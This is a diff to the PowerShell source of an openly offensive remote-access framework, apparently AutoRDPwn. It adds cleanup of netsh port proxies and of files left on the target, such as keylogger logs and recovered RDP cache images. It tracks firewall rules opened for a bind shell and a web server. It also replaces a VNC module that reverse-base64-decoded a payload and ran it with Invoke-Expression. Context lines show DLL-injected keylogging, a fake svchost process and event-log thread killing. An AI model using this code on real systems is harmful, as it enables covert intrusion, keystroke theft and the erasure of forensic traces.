@@ -1,3 +1,51 @@
+if (-not (Get-Variable -Name ARPortProxyPorts -Scope Script -ErrorAction SilentlyContinue)) { $script:ARPortProxyPorts = New-Object System.Collections.Generic.List[string] }
+if (-not (Get-Variable -Name ARModuleFiles -Scope Script -ErrorAction SilentlyContinue)) { $script:ARModuleFiles = New-Object System.Collections.Generic.List[string] }
+
+function Reset-AROperatorPortProxies {
+    if (-not (Get-Variable -Name ARPortProxyPorts -Scope Script -ErrorAction SilentlyContinue)) { return }
+    $records = @($script:ARPortProxyPorts.ToArray())
+    if ($records.Count -eq 0) { return }
+    foreach ($record in $records) {
+        $listenPort = [string]$record
+        $listenAddress = '0.0.0.0'
+        $separator = $listenPort.IndexOf('|')
+        if ($separator -ge 0) {
+            $listenAddress = $listenPort.Substring($separator + 1)
+            $listenPort = $listenPort.Substring(0, $separator)
+        }
+        if ([string]::IsNullOrWhiteSpace($listenPort)) { continue }
+        if ([string]::IsNullOrWhiteSpace($listenAddress)) { $listenAddress = '0.0.0.0' }
+        try {
+            & netsh.exe interface portproxy delete v4tov4 "listenport=$listenPort" "listenaddress=$listenAddress" 2>&1> $null
+            if ($LASTEXITCODE -ne 0 -and $listenAddress -ne '0.0.0.0') {
+                & netsh.exe interface portproxy delete v4tov4 "listenport=$listenPort" "listenaddress=0.0.0.0" 2>&1> $null
+            }
+            if ($LASTEXITCODE -ne 0) { Write-ARWarn ('Port proxy cleanup incomplete for listen port ' + $listenPort + '.') }
+        }
+        catch { Write-ARWarn ('Port proxy cleanup incomplete for listen port ' + $listenPort + '.') }
+    }
+    $script:ARPortProxyPorts.Clear()
+}
+
+function Remove-ARModuleArtifacts {
+    if (-not (Get-Variable -Name ARModuleFiles -Scope Script -ErrorAction SilentlyContinue)) { return }
+    $paths = @($script:ARModuleFiles.ToArray())
+    if ($paths.Count -eq 0) { return }
+    try {
+        if (Test-ARIsLocalTarget) {
+            foreach ($path in $paths) { Remove-Item -LiteralPath $path -Recurse -Force -ErrorAction SilentlyContinue }
+        }
+        elseif ($script:ARSession) {
+            Invoke-Command -Session $script:ARSession -ArgumentList $paths -ScriptBlock {
+                param($items)
+                foreach ($path in $items) { Remove-Item -LiteralPath $path -Recurse -Force -ErrorAction SilentlyContinue }
+            } -ErrorAction Stop | Out-Null
+        }
+    }
+    catch { Write-ARWarn ('Module artifact cleanup incomplete: ' + $_.Exception.Message) }
+    finally { $script:ARModuleFiles.Clear() }
+}
+
 function Invoke-ARModulePipeShell {
     $target = Get-ARTargetComputer
     $scriptPath = Get-ARResourcePath 'Resources\Scripts\Invoke-PipeShell.ps1'
@@ -107,6 +155,8 @@ function Invoke-ARModuleNetcatDirect {
                 Invoke-PowerShellTcp -Bind -Port $localPort
             } -ArgumentList $path, $listenPort | Out-Null
         } -ErrorAction Stop | Out-Null
+        $ruleName = 'Powershell Remote Control Application'
+        if (Get-Variable -Name ARFirewallRules -Scope Script -ErrorAction SilentlyContinue) { if (-not $script:ARFirewallRules.Contains($ruleName)) { $script:ARFirewallRules.Add($ruleName) } }
     }
     Write-Host '----------------------------------------------------------------------' -ForegroundColor Gray
     Write-Host ('Netcat direct connection --> ') -NoNewline -ForegroundColor Green
@@ -239,6 +289,8 @@ function Invoke-ARModulePortForward {
             $rport = Read-ARValue (Get-ARText 'txt43' 'Enter the remote port')
             $rhost = Read-ARValue (Get-ARText 'txt44' 'Finally, the destination IP')
             & $scriptBlock 'add' $lport $lhost $rport $rhost
+            $proxyRecord = $lport + '|' + $lhost
+            if (-not $script:ARPortProxyPorts.Contains($proxyRecord)) { $script:ARPortProxyPorts.Add($proxyRecord) }
         }
         elseif ($operation -eq '4') { & $scriptBlock 'reset' }
         else { & $scriptBlock 'show' }
@@ -251,6 +303,8 @@ function Invoke-ARModulePortForward {
         $rport = Read-ARValue (Get-ARText 'txt43' 'Enter the remote port')
         $rhost = Read-ARValue (Get-ARText 'txt44' 'Finally, the destination IP')
         & netsh.exe interface portproxy add v4tov4 "listenport=$lport" "listenaddress=$lhost" "connectport=$rport" "connectaddress=$rhost"
+        $proxyRecord = $lport + '|' + $lhost
+        if (-not $script:ARPortProxyPorts.Contains($proxyRecord)) { $script:ARPortProxyPorts.Add($proxyRecord) }
         Set-ARStatus 'Local port forwarding created' 'Ok'
         return
     }
@@ -302,6 +356,8 @@ function Invoke-ARModuleWebServer {
                 Start-WebServer -BINDING 'http://+:8080/'
             } -ArgumentList $path | Out-Null
         } -ErrorAction Stop | Out-Null
+        $ruleName = 'Powershell Web Server'
+        if (Get-Variable -Name ARFirewallRules -Scope Script -ErrorAction SilentlyContinue) { if (-not $script:ARFirewallRules.Contains($ruleName)) { $script:ARFirewallRules.Add($ruleName) } }
     }
     $url = 'http://' + $target + ':8080/'
     Write-Host '----------------------------------------------------------------------' -ForegroundColor Gray
@@ -337,6 +393,7 @@ function Invoke-ARModuleRdpCaching {
     $null = Invoke-ARTargetPowerShell -RelativePath 'Resources\Scripts\RDP-Caching.ps1'
     $recovered = Join-Path $env:TEMP 'Recovered_RDP_Session'
     if (-not (Test-Path -LiteralPath $recovered)) { throw 'No cached RDP images were recovered.' }
+    if (-not $script:ARModuleFiles.Contains($recovered)) { $script:ARModuleFiles.Add($recovered) }
     Write-ARSuccess ('Recovered images: ' + $recovered)
     try { Start-Process explorer.exe -ArgumentList $recovered | Out-Null } catch { }
     if (-not $script:ARInvokedFromOption) {
@@ -422,6 +479,7 @@ function Invoke-ARModuleKeylogger {
         try { & $dll nomsg explorer.exe $hostProcess | Out-Null } finally { Pop-Location }
         Start-Sleep -Milliseconds 500
         if (-not (Test-Path -LiteralPath $logPath)) { New-Item -ItemType File -Path $logPath -Force | Out-Null }
+        if (-not $script:ARModuleFiles.Contains($logPath)) { $script:ARModuleFiles.Add($logPath) }
         Write-ARInfo 'Remote Keylogger | Press Ctrl+C to stop'
         try { Get-Content -LiteralPath $logPath -Wait } finally { Get-Process | Where-Object { $_.Path -eq $hostProcess -or $_.Path -like '*\Local\Temp\svchost.exe' } | Stop-Process -Force -ErrorAction SilentlyContinue }
     }
@@ -444,6 +502,7 @@ function Invoke-ARModuleKeylogger {
             if (-not (Test-Path -LiteralPath $log)) { New-Item -ItemType File -Path $log -Force | Out-Null }
             return $log
         } -ErrorAction Stop
+        if (-not $script:ARModuleFiles.Contains([string]$logPath)) { $script:ARModuleFiles.Add([string]$logPath) }
         Write-ARInfo 'Remote Keylogger | Press Ctrl+C to stop'
         try {
             Invoke-Command -Session $session -ArgumentList $logPath -ScriptBlock {
@@ -487,42 +546,11 @@ function Invoke-ARModulePhant0m {
     Set-ARStatus 'Event log threads stopped' 'Ok'
 }
 
+# Screen access runs over the target-side JPEG frame server and its pull viewer.
+# The old route staged a 1.7 MB VNC vendor blob and injected it reflectively;
+# that injection dies silently after the GetProcAddress fix, so it is retired.
 function Invoke-ARModuleVncServer {
-    $target = Get-ARTargetComputer
-    $scriptPath = Get-ARResourcePath 'Resources\Scripts\Invoke-VNCServer.ps1'
-    $encoded = Get-Content -LiteralPath $scriptPath -Raw
-    if (Test-ARIsLocalTarget) {
-        $array = $encoded.ToCharArray()
-        [array]::Reverse($array)
-        $decoded = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String(($array -join '')))
-        Invoke-Expression $decoded | Out-Null
-        Invoke-Vnc -ConType bind -Port 5900 -Password AutoRDPwn
-    }
-    else {
-        $session = Get-ARTargetSession
-        $remoteDirectory = 'C:\Windows\Temp\AutoRDPwnVnc_' + [guid]::NewGuid().ToString('N')
-        $remoteScript = Join-Path $remoteDirectory 'Invoke-VNCServer.ps1'
-        Copy-ARFileToTarget -LocalPath $scriptPath -RemotePath $remoteScript | Out-Null
-        $script:ARRemoteTempDirs.Add($remoteDirectory)
-        Invoke-Command -Session $session -ArgumentList $remoteScript -ScriptBlock {
-            param($path)
-            $payload = Get-Content -LiteralPath $path -Raw
-            $array = $payload.ToCharArray()
-            [array]::Reverse($array)
-            $decoded = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String(($array -join '')))
-            Invoke-Expression $decoded | Out-Null
-            netsh advfirewall firewall delete rule name="AutoRDPwn VNC" 2>&1> $null
-            netsh advfirewall firewall add rule name="AutoRDPwn VNC" dir=in action=allow protocol=TCP localport=5900 2>&1> $null
-            Invoke-Vnc -ConType bind -Port 5900 -Password AutoRDPwn
-        } -ErrorAction Stop | Out-Null
-    }
-    Import-ARToolScript 'Resources\Scripts\Invoke-VNCViewer.ps1'
-    $viewer = Join-Path $script:ARTools 'VNCViewer.exe'
-    if (-not (Test-Path -LiteralPath $viewer)) { throw 'VNCViewer could not be extracted.' }
-    $arguments = @('/password', 'AutoRDPwn', $target, '-disablesponsor', '-nostatus', '-notoolbar', '-autoscaling', '-nocursor')
-    if ([string]$script:ARTarget['Mode'] -eq 'view') { $arguments += '/viewonly' }
-    Start-Process -FilePath $viewer -ArgumentList $arguments | Out-Null
-    Set-ARStatus 'VNC server started' 'Ok'
+    Invoke-ARAttackQuickScreen
 }
 
 function Invoke-ARModuleExternalScript {
